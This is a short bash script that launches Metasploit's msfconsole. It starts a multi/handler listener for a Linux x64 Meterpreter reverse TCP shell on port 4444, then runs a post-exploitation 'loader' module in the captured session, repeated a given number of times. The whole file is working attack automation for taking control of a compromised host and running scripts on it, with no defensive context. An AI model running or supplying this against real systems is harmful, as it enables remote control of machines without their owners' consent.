#!/bin/bash

# Arguments from Meterpreter
script="$1"
iteration="$2"
ip="$3"

# Open a new terminal and execute the commands in msfconsole
gnome-terminal --wait -- bash -c "
echo 'Launching msfconsole...';

# Start msfconsole, set up the exploit and payload, then invoke the loader.rb script for the iteration
msfconsole -q -x '
use exploit/multi/handler;   
set payload linux/x64/meterpreter/reverse_tcp;
set LHOST $ip;
set LPORT 4444;
exploit -j;
sleep 3;
use post/linux/manage/loader;
set SESSION 1;
set SCRIPT_NAME $script;
set ITERATION_COUNT $iteration;
run;
exit -y;
';

echo 'Meterpreter session closed.';
"

# Wait to ensure the session is fully closed before the script exits
sleep 2
exit 0
